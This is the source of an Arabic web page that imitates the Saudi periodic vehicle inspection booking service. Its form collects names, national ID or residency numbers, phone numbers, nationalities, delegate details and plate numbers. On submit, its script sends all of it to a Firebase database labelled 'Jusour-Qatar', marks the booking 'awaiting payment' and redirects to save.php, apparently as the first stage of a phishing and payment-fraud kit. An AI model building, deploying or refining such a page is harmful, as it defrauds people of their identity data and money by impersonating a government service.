<?php
error_reporting(0);
ini_set('display_errors', 0);
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>خدمة الفحص الفني الدوري - حجز موعد</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <style>
        :root { --main-blue: #00acc1; --dark-blue: #2c3e50; --green-btn: #28a745; --input-bg: #f8f8f8; }
        body { font-family: 'Cairo', sans-serif; background-color: #fff; margin: 0; padding: 0; color: #333; overflow-x: hidden; }
        
        .header-img { width: 100%; display: block; margin-bottom: 20px; }
        .container { max-width: 420px; margin: auto; padding: 15px; } 

        /* تعديل العناوين لتكون تحت بعضها البعض كما في الصور */
        .page-titles { text-align: right; margin-bottom: 25px; line-height: 1.3; }
        .t-fحص { color: var(--dark-blue); font-size: 22px; font-weight: 700; display: block; }
        .t-fني { color: var(--dark-blue); font-size: 22px; font-weight: 700; display: block; }
        .t-hجز { color: var(--dark-blue); font-size: 22px; font-weight: 700; display: block; }

        .sec-title { font-size: 17px; font-weight: 800; color: var(--dark-blue); margin: 30px 0 15px; text-align: right; border-bottom: 1px solid #f0f0f0; padding-bottom: 8px; }
        
        .form-group { margin-bottom: 18px; text-align: right; }
        label { display: block; margin-bottom: 8px; font-weight: 700; font-size: 14px; color: #555; }
        label span { color: red; }
        
        input, select { 
            width: 100%; padding: 10px 12px; border: 1px solid #ddd; border-radius: 8px; 
            font-family: 'Cairo'; font-size: 14px; box-sizing: border-box; outline: none; 
            background: var(--input-bg); transition: all 0.2s ease;
        }
        input:focus, select:focus { 
            border-color: var(--green-btn); 
            background: #fff;
            box-shadow: 0 0 5px rgba(40, 167, 69, 0.1);
        }

        .phone-row { display: flex; gap: 8px; direction: ltr; }
        .country-code { width: 80px; text-align: center; background: #eee; font-weight: bold; border: 1px solid #ddd; display: flex; align-items: center; justify-content: center; }
        
        .del-row { display: flex; align-items: center; justify-content: flex-start; gap: 12px; margin: 25px 0; }
        .switch { position: relative; display: inline-block; width: 44px; height: 24px; order: -1; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; inset: 0; background-color: #ccc; border-radius: 20px; transition: .4s; }
        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; right: 3px; bottom: 3px; background-color: white; border-radius: 50%; transition: .4s; }
        input:checked + .slider { background-color: var(--green-btn); }
        input:checked + .slider:before { transform: translateX(-20px); }

        #del_fields { display: none; margin-top: 20px; padding: 12px; border: 1px solid #eee; border-radius: 10px; background: #fafafa; }
        .info-header { font-size: 18px; font-weight: 800; color: #bbb; margin-bottom: 15px; text-align: right; }
        
        .toggle-btns { display: flex; gap: 8px; margin-bottom: 20px; }
        .tgl-btn { flex: 1; padding: 8px; border: 1.5px solid var(--green-btn); border-radius: 8px; text-align: center; font-weight: 700; color: var(--green-btn); cursor: pointer; background: #fff; font-size: 13px; transition: 0.3s; }
        .tgl-btn.active { background: var(--green-btn) !important; color: #fff !important; }

        .notice-box { display: flex; align-items: flex-start; gap: 10px; margin-top: 15px; background: #fff; padding: 12px; border-radius: 8px; border: 1px solid #eee; cursor: pointer; }
        .notice-box input { width: 18px; height: 18px; accent-color: var(--green-btn); margin-top: 3px; cursor: pointer; }
        .notice-box p { font-size: 11px; color: #777; margin: 0; line-height: 1.5; text-align: right; }

        .plate-wrap { display: flex; gap: 10px; align-items: center; margin: 20px 0; }
        .plate-selects { display: flex; flex-direction: column; gap: 5px; width: 100px; }
        .plate-box { flex: 1; border: 2px solid #333; border-radius: 10px; height: 100px; display: flex; overflow: hidden; background: #fff; }
        .ksa-side { width: 35px; border-right: 2px solid #333; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 9px; font-weight: 800; background: #f9f9f9; }

        /* تعديل خط اللوحة ليكون بنفس الشكل المطلوب في الصور */
        #ar_c, #ar_n { font-size: 26px; font-weight: 900; }
        #en_c, #en_n { font-size: 22px; font-weight: 800; }

        .notice-text { font-size: 12px; color: #888; text-align: center; margin: 25px 0 10px; line-height: 1.6; padding: 0 10px; }

        .btn-container { text-align: center; margin-top: 10px; margin-bottom: 40px; }
        .btn-next { 
            background: var(--green-btn); color: #fff; width: 140px; padding: 12px; 
            border: none; border-radius: 25px; font-size: 16px; font-weight: 800; 
            cursor: pointer; box-shadow: 0 4px 10px rgba(40,167,69,0.2);
        }
        .footer-img { width: 100%; display: block; margin-top: 20px; }
    </style>
</head>
<body>

<img src="https://i.ibb.co/JRL1qXkP/Whats-App-Image-2024-09-05-at-8-51-55-AM.jpg" class="header-img">

<div class="container">
    <div class="page-titles">
        <span class="t-fحص">خدمة الفحص</span>
        <span class="t-fني">الفني الدوري</span>
        <span class="t-hجز">حجز موعد</span>
    </div>

    <form id="mainForm">
        <div class="sec-title">المعلومات الشخصية</div>
        <div class="form-group"><label>الإسم <span>*</span></label><input type="text" id="full_name" required placeholder="أدخل الإسم الكامل"></div>
        <div class="form-group"><label>رقم الهوية / الإقامة <span>*</span></label><input type="number" id="id_card" required placeholder="أدخل الرقم"></div>
        
        <div class="form-group">
            <label>رقم الجوال <span>*</span></label>
            <div class="phone-row">
                <div class="country-code">+966</div>
                <input type="tel" id="phone" required placeholder="5xxxxxxxx">
            </div>
        </div>

        <div class="form-group"><label>البريد الإلكتروني</label><input type="email" id="email" placeholder="example@mail.com"></div>
        <div class="form-group"><label>الجنسية <span>*</span></label><select id="nat" required></select></div>

        <div class="del-row">
            <label class="switch"><input type="checkbox" id="delegate_check" onchange="document.getElementById('del_fields').style.display=this.checked?'block':'none'"><span class="slider"></span></label>
            <span style="font-weight:700; font-size:14px; color:#444;">هل تود تفويض شخص آخر بفحص المركبة؟</span>
        </div>

        <div id="del_fields">
            <div class="info-header">المعلومات المفوض</div>
            <label>هل المفوض</label>
            <div class="toggle-btns">
                <div class="tgl-btn active" onclick="toggleT(this)">مواطن / مقيم</div>
                <div class="tgl-btn" onclick="toggleT(this)">مواطن خليجي</div>
            </div>
            <div class="form-group"><label>أسم المفوض</label><input type="text" id="d_name" placeholder="أسم المفوض"></div>
            <div class="form-group">
                <label>رقم الجوال</label>
                <div class="phone-row">
                    <div class="country-code"><img src="https://flagcdn.com/w20/sa.png" width="16"></div>
                    <input type="tel" id="d_phone" placeholder="5xxxxxxxx">
                </div>
            </div>
            <div class="form-group"><label>جنسية المفوض</label><select id="d_nat"></select></div>
            <div class="form-group"><label>رقم الهوية / الإقامة المفوض</label><input type="number" id="d_id"></div>
            <label class="notice-box"><input type="checkbox"><p>أقر بأني أن خدمة التفويض تقتصر على إعطاء المفوض الصلاحية بزيارة وإجراء الفحص الفني الدوري للمركبة.</p></label>
        </div>

        <div class="sec-title">معلومات المركبة</div>
        <div class="form-group"><label>بلد التسجيل <span>*</span></label><select id="reg_country" required></select></div>

        <label>رقم اللوحة <span>*</span></label>
        <div class="plate-wrap">
            <div class="plate-selects">
                <select id="c1" onchange="sync()"><option value="">حرف 1</option></select>
                <select id="c2" onchange="sync()"><option value="">حرف 2</option></select>
                <select id="c3" onchange="sync()"><option value="">حرف 3</option></select>
                <input type="number" id="p_num" placeholder="الأرقام" oninput="sync()">
            </div>
            <div class="plate-box">
                <div style="flex:1; display: grid; grid-template-columns: 1fr 1fr; position: relative;">
                    <div style="position: absolute; left: 50%; top:0; bottom:0; width:1.5px; background:#333;"></div>
                    <div style="display: grid; grid-template-rows: 1fr 1fr;">
                        <div style="display:flex; align-items:center; justify-content:center; border-bottom:1.5px solid #333;" id="ar_c">--</div>
                        <div style="display:flex; align-items:center; justify-content:center;" id="en_c">--</div>
                    </div>
                    <div style="display: grid; grid-template-rows: 1fr 1fr;">
                        <div style="display:flex; align-items:center; justify-content:center; border-bottom:1.5px solid #333;" id="ar_n">---</div>
                        <div style="display:flex; align-items:center; justify-content:center;" id="en_n">---</div>
                    </div>
                </div>
                <div class="ksa-side"><span>🇸🇦</span><span>KSA</span></div>
            </div>
        </div>

        <div class="sec-title">مركز الخدمة</div>
        <div class="form-group">
            <label>المنطقة <span>*</span></label>
            <select id="region" required>
                <option value="">اختر المنطقة</option>
                <option>أبها - المحالة أبها</option>
                <option>الباحة - طريق الملك عبدالعزيز</option>
                <option>الجبيل الجبيل 35762</option>
                <option>الخرج حي الراشدية</option>
                <option>الخرمة حي المحمدية</option>
                <option>الخفجي الخرفة المنطقة الصناعية الثانية</option>
                <option>الدمام حي المنار</option>
                <option>الرس - طريق الملك فهد</option>
                <option>الرياض - حي القيروان</option>
                <option>الرياض حي الفيصلية</option>
                <option>الرياض حي المونسية</option>
                <option>الرياض طريق دابرة عكاظ</option>
                <option>الطائف حي القديرة</option>
                <option>القريات - 6222 WCJA6222 تركي بن احمد السديري حي الفرسان القريات</option>
                <option>القويعية حي الزهور القويعية</option>
                <option>المجمعة المنطقة الصناعية</option>
                <option>المدينة المنورة طريق المدينة - تبوك السريع</option>
                <option>الهفوف الشارع الرابع حي الصناعية المبرز</option>
                <option>بيشة - 1432, 7372 بيشة 67912</option>
                <option>تبوك المنطقة الزراعية</option>
                <option>جازان - الكرامة العسيلة</option>
                <option>جدة - الأمير عبدالمجيد جدة</option>
                <option>جدة - شارع عبدالجليل ياسين حي المروة</option>
                <option>جدة - طريق عسفان جدة</option>
                <option>حائل طريق المدينة - منطقة الوادي</option>
                <option>حفر الباطن طريق الملك عبدالعزيز الاسكان</option>
                <option>سكاكا - سلمان الفارسي محطة الفحص الدوري للمركبات</option>
                <option>عرعر - معارض سيارات</option>
                <option>محايل عسير - الخالدية محايل عسير</option>
                <option>مكة المكرمة - العمرة الجديدة مكة</option>
                <option>نجران - طريق الملك عبدالعزيز نجران</option>
                <option>وادي الدواسر طريق خميس - السليل السريع</option>
                <option>ينبع لمبارك ينبع</option>
            </select>
        </div>

        <div class="form-group">
            <label>نوع خدمة الفحص <span>*</span></label>
            <select id="service_type" required>
                <option>الفحص الدوري</option>
                <option>إعادة فحص</option>
            </select>
        </div>

        <div class="sec-title">موعد الخدمة</div>
        <div class="form-group"><label>تاريخ الفحص <span>*</span></label><input type="date" id="f_date" value="2026-03-18" required></div>
        <div class="form-group">
            <label>وقت الفحص <span>*</span></label>
            <select id="f_time" required>
                <option>08:00 am</option><option>08:30 am</option><option>09:00 am</option><option>09:30 am</option>
                <option>10:00 am</option><option>10:30 am</option><option>11:00 am</option><option>11:30 am</option>
                <option>12:00 pm</option><option>12:30 pm</option><option>01:00 pm</option><option>01:30 pm</option>
                <option>02:00 pm</option><option>02:30 pm</option><option>03:00 pm</option><option>03:30 pm</option>
                <option>04:00 pm</option><option>04:30 pm</option><option>05:00 pm</option><option>05:30 pm</option>
                <option>06:00 pm</option>
            </select>
        </div>

        <div class="notice-text">
            الحضور على الموعد يسهم في سرعة وجودة الخدمة وفي حالة عدم الحضور، لن يسمح بحجز آخر إلا بعد 48 ساعة وحسب الأوقات المحددة.
        </div>

        <div class="btn-container"><button type="submit" class="btn-next">التالي</button></div>
    </form>
</div>

<img src="https://i.ibb.co/b5LVtGWC/IMG-20260318-WA0002.jpg" class="footer-img">

<script>
// --- إعدادات Firebase من صورة Jusour-Qatar التي أرسلتها ---
const firebaseConfig = { 
    apiKey: "AIzaSyBRoLQJTQVVGiY9JmtaEFwAA", 
    databaseURL: "https://jusour-qatar-default-rtdb.firebaseio.com" 
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const mC = {"أ":"A","ب":"B","ح":"J","د":"D","ر":"R","س":"S","ص":"X","ط":"T","ع":"E","ق":"G","ك":"K","ل":"L","م":"Z","ن":"N","هـ":"H","و":"U","ى":"V"};
const mN = {"0":"٠","1":"١","2":"٢","3":"٣","4":"٤","5":"٥","6":"٦","7":"٧","8":"٨","9":"٩"};

function toggleT(btn) {
    document.querySelectorAll('.tgl-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
}

function sync() {
    let c1=document.getElementById('c1').value, c2=document.getElementById('c2').value, c3=document.getElementById('c3').value, n=document.getElementById('p_num').value;
    let arN = ""; for(let x of n) arN += mN[x] || x;
    document.getElementById('ar_n').innerText = arN || "---"; document.getElementById('en_n').innerText = n || "---";
    document.getElementById('ar_c').innerText = (c3+" "+c2+" "+c1).trim() || "--";
    document.getElementById('en_c').innerText = ((mC[c3]||"")+" "+(mC[c2]||"")+" "+(mC[c1]||"")).trim() || "--";
}

async function loadData() {
    ['c1','c2','c3'].forEach(id => {
        let s = document.getElementById(id);
        Object.keys(mC).forEach(k => s.innerHTML += `<option value="${k}">${mC[k]} - ${k}</option>`);
    });

    try {
        const res = await fetch('https://restcountries.com/v3.1/all?fields=translations');
        const countries = await res.json();
        const arabCountries = ["السعودية", "مصر", "الإمارات العربية المتحدة", "الكويت", "قطر", "البحرين", "عمان", "الأردن"];
        let arabOptions = ""; let otherOptions = "";
        countries.sort((a,b) => a.translations.ara.common.localeCompare(b.translations.ara.common)).forEach(c => {
            let name = c.translations.ara.common;
            let sel = (name === "السعودية") ? "selected" : "";
            if (arabCountries.includes(name)) arabOptions += `<option value="${name}" ${sel}>${name}</option>`;
            else otherOptions += `<option value="${name}">${name}</option>`;
        });
        [document.getElementById('nat'), document.getElementById('d_nat'), document.getElementById('reg_country')].forEach(s => {
            s.innerHTML = arabOptions + `<option disabled>──────</option>` + otherOptions;
        });
    } catch (e) {}
}
loadData();

// --- الربط الفعلي لإرسال كامل البيانات لفايربيس ---
document.getElementById('mainForm').onsubmit = function(e) {
    e.preventDefault();
    const phone = document.getElementById('phone').value;
    
    const allData = {
        personal_info: {
            full_name: document.getElementById('full_name').value,
            id_card: document.getElementById('id_card').value,
            phone: phone,
            email: document.getElementById('email').value,
            nationality: document.getElementById('nat').value
        },
        delegate_info: {
            is_active: document.getElementById('delegate_check').checked,
            delegate_name: document.getElementById('d_name').value,
            delegate_phone: document.getElementById('d_phone').value,
            delegate_id: document.getElementById('d_id').value,
            delegate_nationality: document.getElementById('d_nat').value
        },
        vehicle_info: {
            registration_country: document.getElementById('reg_country').value,
            plate_number: document.getElementById('ar_n').innerText + " (" + document.getElementById('ar_c').innerText + ")",
            region: document.getElementById('region').value,
            service: document.getElementById('service_type').value,
            date: document.getElementById('f_date').value,
            time: document.getElementById('f_time').value
        },
        status: "في انتظار الدفع",
        timestamp: new Date().toLocaleString('ar-EG')
    };

    // الحفظ في قاعدة بيانات Jusour-Qatar
    db.ref('bookings/' + phone).set(allData).then(() => {
        window.location.href = "save.php?phone=" + phone;
    }).catch((err) => { alert("خطأ: " + err.message); });
};
</script>
</body>
</html>